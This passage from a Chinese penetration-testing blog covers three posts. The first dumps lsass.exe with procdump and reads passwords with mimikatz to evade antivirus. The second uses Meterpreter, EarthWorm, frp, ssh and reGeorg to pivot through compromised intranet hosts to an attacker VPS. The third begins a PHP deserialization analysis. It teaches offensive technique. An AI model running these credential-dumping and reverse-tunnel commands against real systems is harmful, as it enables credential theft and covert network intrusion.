Procdump+Mimikatz读取密码Hash"></a>0x04 Procdump+Mimikatz读取密码Hash</h2><p>介绍完<code>windows</code>本地认证机制，可以发现在 <code>lsass.exe</code>进程中是会存在有明文密码的，于是可以直接使用<code>mimikatz</code>读取，但是这样通常会被拦截</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="built_in">log</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-4.png" alt="lmhash-ntlmhash-4"></p><p>所以可以利用工具<code>procdump</code>将<code>lsass.exe</code> <code>dump</code>出来，拉到没有杀软的机器里面使用<code>mimikatz</code>读取密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dump</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-5.webp" alt="lmhash-ntlmhash-5"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-6.webp" alt="lmhash-ntlmhash-6"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 本地认证 </tag>
            
            <tag> LM Hash </tag>
            
            <tag> NTLM Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈内网渗透代理</title>
      <link href="2020/talking-about-intranet-penetration-agent.html"/>
      <url>2020/talking-about-intranet-penetration-agent.html</url>
      
        <content type="html"><![CDATA[<p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/8001">https://xz.aliyun.com/t/8001</a></p><p>这篇文章列举几种内网代理方法。</p><a id="more"></a><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p><code>Meterpreter</code>可以说是渗透中用得较多的工具，在反弹了处于内网的目标<code>shell</code>之后，介绍两种代理方式。</p><h3 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h3><p><code>portfwd</code>用于转发单个端口，当你目的性很强的情况下，比如只需要目标的<code>3389</code>端口等，这不失为一种较好的方法。</p><p>详细使用语法见：<a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a></p><p>大致如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 7003 –p 3389 –r 192.168.52.138</span><br><span class="line"><span class="comment"># 添加转发 -l：服务器监听端口  -p：内网主机需转发端口  -r：目标内网主机ip</span></span><br><span class="line">meterpreter &gt; portfwd delete –l 3389 –p 3389 –r 172.16.194.191</span><br><span class="line"><span class="comment"># 删除转发</span></span><br><span class="line">meterpreter &gt; portfwd list</span><br><span class="line"><span class="comment"># 列出当前正在侦听和转发的端口列表</span></span><br><span class="line">meterpreter &gt; portfwd flush</span><br><span class="line"><span class="comment"># 移除所有转发端口</span></span><br></pre></td></tr></table></figure><h3 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h3><p><code>socks</code>代理只是<code>tcp</code>一层往上，如<code>icmp</code>、<code>arp</code>等就无法被代理。</p><p><code>msf</code>中内置了三个<code>socks</code>代理模块，分别是<code>socks4a</code>、<code>socks5</code>、<code>socks_unc</code>。一般常使用 <code>socks4a</code>和<code>socks5</code>进行代理。其二者只是由于所支持的具体应用不同而存在差异。<code>socks4</code>只支持<code>TCP</code>协议而<code>socks5</code>支持<code>TCP/UDP</code>协议，还支持各种身份验证机制等协议，也就是说这里使用<code>socks5</code>的话还需要设置用户名与密码。</p><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-1.png" alt="Intranet-proxy-1"></p><p>在获取<code>shell</code>的机器上添加路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.21.0/24</span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加路由</span></span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示路由</span></span><br><span class="line">meterpreter &gt; route flush </span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-2.webp" alt="Intranet-proxy-2"></p><p>可以先通过<code>arp</code>扫描内网大概存活机器情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-3.webp" alt="Intranet-proxy-3"></p><p>然后建立<code>socks4</code>代理，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; set srvhost 127.0.0.1</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; set srvport 1080</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-4.png" alt="Intranet-proxy-4"></p><p>设置完成后配置<code>proxychains</code>，成功</p><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-5.webp" alt="Intranet-proxy-5"></p><p><code>socks5</code>模块也同理，只是会多设置一个用户名与密码。</p><p>参考：</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/105872076">https://blog.csdn.net/qq_36119192/article/details/105872076</a></p><p><a href="https://klionsec.github.io/2016/09/25/msf-socks4a/">https://klionsec.github.io/2016/09/25/msf-socks4a/</a></p><h2 id="NATBypass"><a href="#NATBypass" class="headerlink" title="NATBypass"></a>NATBypass</h2><p><a href="https://github.com/cw1997/NATBypass">NATBypass</a>是一个端口转发工具，类似于<code>lcx</code>，称为<code>golang</code>版<code>lcx</code>，可编译为<code>linux</code>或<code>windows</code>版本。</p><p>具体原理大概就是公网<code>vps</code>监听两个本地端口，内网目标主机建立一个端口转发，比如将本地<code>3389</code>转发到公网<code>vps</code>的一个端口，<code>vps</code>监听的另一个端口就相当于内网主机<code>3389</code>。</p><p>公网vps</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nb -listen 1997 2017</span><br></pre></td></tr></table></figure><p>内网主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nb -slave 127.0.0.1:3389 x.x.x.x:1997</span><br><span class="line"><span class="meta">#</span><span class="bash"> x.x.x.x是公网vps的IP</span></span><br></pre></td></tr></table></figure><p>本机直接访问公网<code>vps</code>的<code>2017</code>端口即可实现远程内网主机。</p><h2 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h2><p><code>ssh</code>可以端口转发或是建立<code>socks5</code>隧道。</p><h3 id="公网主机建立SOCKS隧道"><a href="#公网主机建立SOCKS隧道" class="headerlink" title="公网主机建立SOCKS隧道"></a>公网主机建立SOCKS隧道</h3><p>如果是具有公网地址的主机利用<code>ssh</code>建立<code>socks5</code>隧道就简单了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -f -D 9070 x.x.x.x</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-6.webp" alt="Intranet-proxy-6"></p><p>随后编辑本机<code>/etc/proxychains.conf</code>文件：</p><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-7.webp" alt="Intranet-proxy-7"></p><p>代理成功：</p><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-8.png" alt="Intranet-proxy-8"></p><p>浏览器设置代理：</p><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-9.webp" alt="Intranet-proxy-9"></p><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-10.webp" alt="Intranet-proxy-10"></p><h3 id="通过公网主机穿透两个内网"><a href="#通过公网主机穿透两个内网" class="headerlink" title="通过公网主机穿透两个内网"></a>通过公网主机穿透两个内网</h3><p>设想一下，你和目标主机分属不同的内网，从外界都无法直接连通。不过好在这两个内网都可以访问公网（JumpHost），你考虑通过一台公网机器建立两个内网之间的隧道。</p><p>在目标主机中执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfNn -R 2222:localhost:22 JumpHost</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-11.png" alt="Intranet-proxy-11"></p><p>现在登录公网主机执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2222 localhost</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-12.webp" alt="Intranet-proxy-12"></p><p>达到的效果只是将目标主机的端口转发到了公网，但是并未实现<code>socks</code>代理，思考后，尝试了后都不成功，不知可行否，若有师傅告知非常感激！</p><p>参考：<a href="https://cherrot.com/tech/2017/01/08/ssh-tunneling-practice.html">https://cherrot.com/tech/2017/01/08/ssh-tunneling-practice.html</a></p><h2 id="Earthworm"><a href="#Earthworm" class="headerlink" title="Earthworm"></a>Earthworm</h2><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-13.webp" alt="Intranet-proxy-13"></p><p>简称<code>EW</code>，<a href="https://github.com/rootkiter/EarthWorm">官方项目</a>已停止更新，可在<a href="https://github.com/z1un/ew">fork地址</a>下载。</p><p>详细使用语法见：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p><code>EW</code>功能很强大，提供“正向”、“反向”、“多级级联”等方式打通隧道，更适用不同的操作系统，<code>Linux</code>、<code>Windows</code>、<code>MacOS</code>、<code>Arm-Linux</code> 。下面介绍一种简单的反向代理方法。</p><p>公网<code>vps</code>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 7010 -e 7011</span><br></pre></td></tr></table></figure><p>目标内网主机执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\ew_for_Win.exe -s rssocks -d x.x.x.x -e 7011</span><br><span class="line"><span class="meta">#</span><span class="bash"> windows</span></span><br><span class="line">./ew_for_linux64 -s rssocks -d x.x.x.x -e 7011</span><br><span class="line"><span class="meta">#</span><span class="bash"> linux</span></span><br></pre></td></tr></table></figure><p>本地攻击机即可通过<code>proxychains</code>或者浏览器设置<code>socks5</code>代理至公网<code>vps</code>的<code>7011</code>端口即可。</p><p>注：无意间浏览该工具作者的博客发现了该工具的新版本，<a href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a> 还没来得及测试使用，先分享一下。</p><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-14.webp" alt="Intranet-proxy-14"></p><p><code>frp</code>作为反向代理工具胜在稳定，但是其依赖配置文件，溯源容易。</p><p>项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>可用于端口映射或打通<code>socks</code>隧道，下面介绍<code>socks</code>隧道代理</p><p>公网vps主机<code>frps.ini</code>文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = password</span><br></pre></td></tr></table></figure><p>启动<code>frps</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p>目标内网主机<code>frpc.ini</code>文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = password</span><br><span class="line"></span><br><span class="line"><span class="section">[socks5]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7004</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure><p>启动<code>frpc</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><p>本地攻击机修改<code>/etc/prxoychains.conf</code>配置文件即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 x.x.x.x 7004</span><br></pre></td></tr></table></figure><h2 id="基于web服务的socks5隧道"><a href="#基于web服务的socks5隧道" class="headerlink" title="基于web服务的socks5隧道"></a>基于web服务的socks5隧道</h2><p>基于<code>web</code>服务的<code>socks</code>隧道使用方便，可用于突破网络限制。常用的工具有：<a href="https://github.com/sensepost/reGeorg">reGeorg</a>，<a href="https://github.com/sensepost/reDuh">reDuh</a>，<a href="https://github.com/SECFORCE/Tunna">Tunna</a>等。</p><p>使用方法都大致一样，上传对应网站语言的脚本文件到目标内网服务器，本地利用脚本连接建立<code>socks5</code>隧道即可。</p><p>比如<code>reGeorg</code>：</p><p>根据目标服务器解析语言，选择脚本上传到服务器端，访问显示<code>Georg says, &#39;All seems fine&#39;</code>，表示脚本运行正常。</p><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-15.png" alt="Intranet-proxy-15"></p><p>本地攻击主机运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -p 7001 -u http://url/tunnel.php</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-16.webp" alt="Intranet-proxy-16"></p><p>监听<code>7001</code>端口，出现<code>Georg says, &#39;All seems fine&#39;</code>字样表明运行正常。可结合<code>prxoychains</code>进行代理。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php和python反序列化漏洞分析</title>
      <link href="2020/analysis-of-php-and-python-deserialization-vulnerability.html"/>
      <url>2020/analysis-of-php-and-python-deserialization-vulnerability.html</url>
      
        <content type="html"><![CDATA[<p>首发于先知社区：<a href="https://xz.aliyun.com/t/7751">https://xz.aliyun.com/t/7751</a></p><p>之前一直有接触挺多反序列化的漏洞，但是自己一直没有很细心地学习这方面的东西，所以现在花时间分析一下php、python中的反序列化漏洞，其大体都是差不多的，部分代码来源互联网。</p><blockquote><p>序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p></blockquote><p>简单来说序列化就是把一个对象的数据和数据类型转成格式化字符串的过程，反序列化则是将这些格式化字符串转为对象形式的过程。因此面向对象的编程都会有概率可能存在反序列化漏洞。</p><h2 id="0x01-PHP"><a href="#0x01-PHP" class="headerlink" title="0x01 PHP"></a>0x01 PHP</h2><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>在审计<code>php反序列化</code>漏洞的时候需要着重注意几个典型的魔术方法：</p><table><thead><tr><th>函数</th><th>简介</th></tr></thead><tbody><tr><td><code>__sleep</code></td><td><code>serialize()</code>函数在执行时会检查是否存在一个<code>__sleep</code>魔术方法，如果存在，则先被调用</td></tr><tr><td><code>__wakeup</code></td><td><code>unserialize()</code>函数执行时会检查是否存在一个<code>__wakeup</code> 方法，如果存在，则先被调用</td></tr><tr><td><code>__construct</code></td><td>构造函数会在每次创建新对象时先调用</td></tr><tr><td><code>__destruct</code></td><td>析构函数是<code>php5</code>新添加的内容，析构函数会在到对象的所有引用都被删除或者当对象被显式销毁时执行</td></tr><tr><td><code>__toString</code></td><td>当对象被当做字符串的时候会自动调用该函数</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;zjun&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="string">&#x27;19&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintVar</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;name &#x27;</span>.<span class="keyword">$this</span> -&gt; name . <span class="string">&#x27;, age &#x27;</span> . <span class="keyword">$this</span> -&gt; age . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destory</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destory&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Student();</span><br><span class="line"><span class="variable">$obj</span> -&gt; age = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$obj</span> -&gt; name = <span class="string">&#x27;reder&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span> -&gt; PrintVar();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="variable">$s_serialize</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s_serialize</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$unseri</span> = unserialize(<span class="variable">$s_serialize</span>);</span><br><span class="line"><span class="variable">$unseri</span> -&gt; PrintVar();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__construct</span><br><span class="line">name reder, age 18</span><br><span class="line">__toString__sleep</span><br><span class="line">O:7:&quot;Student&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;reder&quot;;s:3:&quot;age&quot;;i:18;&#125;</span><br><span class="line">__wakeup</span><br><span class="line">name reder, age 18</span><br></pre></td></tr></table></figure><p>在进行构造反序列化<code>payload</code>时，可跟进以上几个比较典型的魔术变量进行深入挖掘。</p><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><p>在<code>php</code>中，序列化和反序列化一般用做应用缓存，比如<code>session</code>缓存，<code>cookie</code>等，或者是格式化数据存储，例如<code>json</code>，<code>xml</code>等。</p><p>一个很简单的序列化代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;zjun&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">GetName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zjun&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> Student();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>-&gt;GetName().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$s_serialize</span> = serialize(<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s_serialize</span>;</span><br></pre></td></tr></table></figure><p>一个<code>Student</code>类，其中有一个<code>name</code>属性和一个<code>GetName</code>方法，然后实例化了<code>Student</code>类的对象，输出调用<code>GetName</code>这个类方法，然后<code>serialize()</code>函数把对象转成字符串，也就是序列化，再输出序列化后的内容</p><p>输出结果：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zjun</span><br><span class="line">O:7:&quot;Student&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;&#125;</span><br></pre></td></tr></table></figure><p>序列化的数据详解：</p><p><code>O</code>是<code>object</code>表示对象，<code>:</code>后边的内容为这个对象的属性，<code>7</code>表示对象名称的长度，<code>Student</code>就是对象名，<code>1</code>表示对象有一个成员变量，就是<code>&#123;&#125;</code>里面的东西，<code>s</code>表示这个成员变量是一个<code>str</code>字符串，他的长度为<code>4</code>，后面跟着成员变量名，以及这个成员变量的数据类型，长度，内容。</p><p>这里代码只有一个<code>public</code>属性，如果有<code>protected</code>或者<code>private</code>属性，在序列化的数据中也都会体现出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;zjun&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="string">&#x27;19&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$weight</span> = <span class="string">&#x27;53&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">GetName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zjun&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> Student();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>-&gt;GetName().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$s_serialize</span> = serialize(<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s_serialize</span>;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zjun</span><br><span class="line">O:7:&quot;Student&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;s:6:&quot;*age&quot;;s:2:&quot;19&quot;;s:15:&quot;Studentweight&quot;;s:2:&quot;53&quot;;&#125;</span><br></pre></td></tr></table></figure><p>可见<code>public</code>类型直接是变量名，<code>protected</code>类型有<code>*</code>号，但是其长度为<code>6</code>，是因为<code>\x00+*+\x00+变量名</code>。同理<code>private</code>类型会带上对象名，其长度是<code>15</code>，<code>\x00+类名+\x00+变量名</code>。</p><p>以上的这个过程就称为<code>php序列化</code>，再看看反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;zjun&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">GetName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zjun&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$Student</span> = <span class="string">&#x27;O:7:&quot;Student&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$s_unserialize</span> = unserialize(<span class="variable">$Student</span>);</span><br><span class="line">    print_r(<span class="variable">$s_unserialize</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>unserialize()</code>函数就是用来反序列化的函数，输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Student Object ( [name] =&gt; zjun )</span><br></pre></td></tr></table></figure><p>一个<code>Student</code>对象，其中<code>name</code>成员变量等于<code>zjun</code>，这就是反序列化，将格式化字符串转化为对象。</p><p>在这个过程中本来是挺正常的，在一些特殊情景下却能造成如<code>rce</code>等漏洞，如</p><figure class="highlight 